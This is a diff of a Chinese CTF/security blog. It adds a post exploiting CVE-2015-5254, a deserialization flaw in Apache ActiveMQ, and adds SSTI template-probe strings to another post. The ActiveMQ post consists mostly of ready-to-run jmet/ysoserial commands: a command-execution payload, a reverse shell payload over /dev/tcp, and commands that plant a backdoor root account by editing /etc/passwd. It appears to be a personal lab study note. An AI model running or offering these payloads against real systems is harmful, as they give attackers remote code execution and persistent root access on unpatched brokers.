@@ -109,6 +109,92 @@
     
     
     <article
+  id="post-CVE-2015-5254"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/09/22/CVE-2015-5254/"
+    >CVE-2015-5254</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/09/22/CVE-2015-5254/" class="article-date">
+  <time datetime="2020-09-22T13:40:51.000Z" itemprop="datePublished">2020-09-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> / <a class="article-category-link" href="/categories/CTF/CVE/">CVE</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="lt-ActiveMQ-反序列化漏洞-gt-待完全理解"><a href="#lt-ActiveMQ-反序列化漏洞-gt-待完全理解" class="headerlink" title="&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)"></a>&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
+<!--morer-->
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用过程如下：</p>
+<ol>
+<li>构造（可以使用ysoserial）可执行命令的序列化对象</li>
+<li>作为一个消息，发送给目标61616端口</li>
+<li>访问web管理页面，读取消息，触发漏洞</li>
+</ol>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
+<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>
+
+<p>然后登陆页面</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event">http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event</a></p>
+<p>点击消息，触发漏洞</p>
+<p>然后进入docker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it   9a540c50a8dc  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>如果在/tmp目录下存在success文件则显示成功</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;12340&gt;&amp;1&quot; -Yp ROME 127.0.0.1   61616</span><br></pre></td></tr></table></figure>
+
+<p>外面用nc监听1234端口</p>
+<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -g root -s &#x2F;bin&#x2F;bash -u 10010 test</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s&#x2F;test:x:10010&#x2F;test:x:0&#x2F;g&quot; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:sd123456&quot; | chpasswd</span><br></pre></td></tr></table></figure>
+
+<p>到这里就可以完全创建一个具有root权限的用户，稍后进行远程登陆就可以了。</p>
+<h2 id="jmet的使用"><a href="#jmet的使用" class="headerlink" title="jmet的使用"></a>jmet的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target&#x2F;jmet-0.1.0-all.jar</span><br><span class="line">ERROR d.c.j.JMET [main] Misconfiguration: Missing required options: [-C Custom script exploitation mode, -Y Deser exploitation mode, -X XXE exploitation mode], [-T topic name, -Q queue name], I</span><br><span class="line">usage: jmet [host] [port]</span><br><span class="line"> -C,--Custom &lt;scriptname&gt;         Custom script exploitation mode</span><br><span class="line"> -f,--filter &lt;scriptname&gt;         filter script</span><br><span class="line"> -I,--impl &lt;arg&gt;                  ActiveMQ| Artemis| WebSphereMQ| Qpid10|</span><br><span class="line">                                  Qpid09| HornetQ| SwiftMQ| RabbitMQ|</span><br><span class="line">                                  OpenMQ</span><br><span class="line"> -pw,--password &lt;pass&gt;            password for authentication</span><br><span class="line"> -Q,--Queue &lt;name&gt;                queue name</span><br><span class="line"> -s,--substitute                  Substituation mode: Use §§ to pass</span><br><span class="line">                                  ysoserial payload name to CMD</span><br><span class="line"> -T,--Topic &lt;name&gt;                topic name</span><br><span class="line"> -u,--user &lt;id&gt;                   user for authentication</span><br><span class="line"> -v,--verbose                     Running verbose mode</span><br><span class="line"> -X,--XXE &lt;URL&gt;                   XXE exploitation mode</span><br><span class="line"> -Xp,--xxepayload &lt;payloadname&gt;   Optional: XXE Payload to use EXTERNAL|</span><br><span class="line">                                  PARAMATER| DTD</span><br><span class="line"> -Y,--ysoserial &lt;CMD&gt;             Deser exploitation mode</span><br><span class="line"> -Yp,--payload &lt;payloadname&gt;      Optional: Ysoserial Payload to use</span><br><span class="line">                                  BeanShell1| CommonsBeanutils1|</span><br><span class="line">                                  CommonsCollections1|</span><br><span class="line">                                  CommonsCollections2|</span><br><span class="line">                                  CommonsCollections3|</span><br><span class="line">                                  CommonsCollections4|</span><br><span class="line">                                  CommonsCollections5| Groovy1|</span><br><span class="line">                                  Hibernate1| Hibernate2| Jdk7u21| JSON1|</span><br><span class="line">                                  ROME| Spring1| Spring2</span><br><span class="line"> -Zc,--channel &lt;channel&gt;          channel name (only WebSphereMQ)</span><br><span class="line"> -Zq,--queuemanager &lt;name&gt;        queue manager name (only WebSphereMQ)</span><br><span class="line"> -Zv,--vhost &lt;name&gt;               vhost name (only AMQP-Brokers:</span><br><span class="line">                                  RabbitMQ|QPid09|QPid10)</span><br></pre></td></tr></table></figure>
+
+<p>其中的深层次的原理等待java+web学完之后回来补</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE%EF%BC%8C%E6%9C%AA%E5%AE%8C%E5%85%A8%E8%A7%A3%E5%86%B3/" rel="tag">CVE，未完全解决</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
   id="post-ThinkPhp-4"
   class="article article-type-post"
   itemscope
@@ -384,6 +470,9 @@
        
   <h1 id="一-、什么是SSTI"><a href="#一-、什么是SSTI" class="headerlink" title="一 、什么是SSTI"></a>一 、什么是SSTI</h1><h2 id="0x00-模板注入"><a href="#0x00-模板注入" class="headerlink" title="0x00 模板注入"></a>0x00 模板注入</h2><p>这是基于现在的MVC成熟的开发模式所导致的，开发者将输入通过V接收，交给C，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做<strong>模板</strong>的技术。<strong>这种模板的技术不是仅存在于Python</strong>，只要能使用模版进行开发的地方都会有这个问题，SSTI不属于任何一种的问题，沙盒绕过也不是。</p>
 <h2 id="0x01常见的模板"><a href="#0x01常见的模板" class="headerlink" title="0x01常见的模板"></a>0x01常见的模板</h2><p>PHP：Smarty，Twig（经常出题），Blade</p>
+<p>判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Twig </span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;  #输出49</span><br><span class="line">Jinja</span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;  #输出7777777</span><br></pre></td></tr></table></figure>
+
 <p>Java：JSP，FreeMarker，Velocity</p>
 <p>Python： Jinja2（常用），django，tornado</p>
 <p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号中执行</p> 
